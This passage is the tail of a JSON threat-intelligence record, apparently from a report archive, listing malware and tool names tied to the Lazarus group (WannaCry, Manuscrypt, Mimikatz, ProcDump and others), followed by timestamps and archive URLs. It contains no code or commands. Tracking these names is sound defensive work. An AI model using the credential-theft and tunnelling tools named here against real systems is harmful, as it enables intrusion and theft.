                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716498,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1600117145,
    "ts_modification_date": 1600107423,
    "files": {
        "pdf": "https://archive.orkl.eu/c779cbedc36ea2658aa8b2b07578ec90254a36da.pdf",
        "text": "https://archive.orkl.eu/c779cbedc36ea2658aa8b2b07578ec90254a36da.txt",
        "img": "https://archive.orkl.eu/c779cbedc36ea2658aa8b2b07578ec90254a36da.jpg"
    }
}